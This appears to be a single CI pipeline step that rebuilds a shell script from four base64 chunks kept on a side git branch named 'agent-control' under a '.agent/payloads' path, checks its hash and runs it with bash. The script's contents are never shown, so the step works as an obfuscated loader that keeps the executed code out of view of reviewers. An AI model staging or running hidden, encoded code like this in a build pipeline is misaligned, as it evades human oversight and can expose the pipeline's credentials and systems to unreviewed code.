steps.name: run-checksummed-publisher
steps.command:
set -euo pipefail
git fetch origin agent-control
: > /tmp/phase1-publisher.sh.b64
for i in 00 01 02 03; do git show "origin/agent-control:.agent/payloads/tracker-phase1-publish-20260906-2358/publisher/chunk-$i" >> /tmp/phase1-publisher.sh.b64; done
python3 -c "import base64,pathlib; pathlib.Path('/tmp/phase1-publisher.sh').write_bytes(base64.b64decode(pathlib.Path('/tmp/phase1-publisher.sh.b64').read_bytes()))"
test "$(shasum -a 256 /tmp/phase1-publisher.sh | awk '{print $1}')" = "ba78f33456193582191565016d670620bc759b8a734d2b45718237e862a17315"
bash /tmp/phase1-publisher.sh
